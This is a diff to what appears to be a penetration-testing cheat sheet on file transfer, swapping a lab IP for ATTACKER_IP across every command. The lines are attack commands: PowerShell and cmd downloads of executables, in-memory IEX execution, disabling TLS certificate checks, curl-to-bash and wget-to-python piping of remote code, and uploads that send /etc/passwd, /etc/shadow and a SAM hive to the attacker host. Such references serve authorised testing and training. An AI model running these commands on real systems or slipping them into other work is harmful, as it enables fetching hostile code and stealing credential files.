@@ -41,49 +41,49 @@ sudo python3 -m pyftpdlib --port 21 --write
 
 ```powershell
 # WebClient (works on every PowerShell version)
-(New-Object Net.WebClient).DownloadFile("http://10.10.14.5:8000/wp.exe","C:\Windows\Temp\wp.exe")
+(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/wp.exe","C:\Windows\Temp\wp.exe")
 # Invoke-WebRequest (slower; -UseBasicParsing avoids the IE engine error)
-iwr http://10.10.14.5:8000/wp.exe -OutFile C:\Windows\Temp\wp.exe -UseBasicParsing
+iwr http://ATTACKER_IP:8000/wp.exe -OutFile C:\Windows\Temp\wp.exe -UseBasicParsing
 # Fileless: run in memory, nothing touches disk
-IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.5:8000/script.ps1")
+IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP:8000/script.ps1")
 # Bypass a self-signed TLS error first
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 
 ```cmd
 :: SMB share you host (map a drive if guest is blocked)
-copy \\10.10.14.5\share\wp.exe C:\Windows\Temp\
-net use n: \\10.10.14.5\share /user:pt pt && copy n:\wp.exe
+copy \\ATTACKER_IP\share\wp.exe C:\Windows\Temp\
+net use n: \\ATTACKER_IP\share /user:pt pt && copy n:\wp.exe
 :: FTP with a scripted command file (non-interactive shells)
-echo open 10.10.14.5> ftp.txt& echo USER anonymous>> ftp.txt& echo binary>> ftp.txt& echo GET wp.exe>> ftp.txt& echo bye>> ftp.txt& ftp -v -n -s:ftp.txt
+echo open ATTACKER_IP> ftp.txt& echo USER anonymous>> ftp.txt& echo binary>> ftp.txt& echo GET wp.exe>> ftp.txt& echo bye>> ftp.txt& ftp -v -n -s:ftp.txt
 ```
 
 ## Windows: upload
 
 ```powershell
 # To a Python uploadserver, via a small helper script
-IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5:8000/PSUpload.ps1")
-Invoke-FileUpload -Uri http://10.10.14.5:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP:8000/PSUpload.ps1")
+Invoke-FileUpload -Uri http://ATTACKER_IP:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 # To an FTP server
-(New-Object Net.WebClient).UploadFile("ftp://10.10.14.5/hosts","C:\Windows\System32\drivers\etc\hosts")
+(New-Object Net.WebClient).UploadFile("ftp://ATTACKER_IP/hosts","C:\Windows\System32\drivers\etc\hosts")
 # To an SMB share you host
-copy C:\loot\sam.hive \\10.10.14.5\share\
+copy C:\loot\sam.hive \\ATTACKER_IP\share\
 ```
 
 ## Linux: download and upload
 
 ```bash
 # Download
-wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh
-curl http://10.10.14.5:8000/tool -o /tmp/tool
-scp pt@10.10.14.5:/srv/tool /tmp/tool
+wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
+curl http://ATTACKER_IP:8000/tool -o /tmp/tool
+scp pt@ATTACKER_IP:/srv/tool /tmp/tool
 # Fileless: pipe straight into a shell or interpreter
-curl http://10.10.14.5:8000/linpeas.sh | bash
-wget -qO- http://10.10.14.5:8000/x.py | python3
+curl http://ATTACKER_IP:8000/linpeas.sh | bash
+wget -qO- http://ATTACKER_IP:8000/x.py | python3
 
 # Upload to a uploadserver (use --insecure with a self-signed cert on HTTPS)
-curl -X POST http://10.10.14.5:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
-scp /etc/passwd pt@10.10.14.5:/loot/
+curl -X POST http://ATTACKER_IP:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
+scp /etc/passwd pt@ATTACKER_IP:/loot/
 ```
 
 ## Base64 copy and paste (no network)
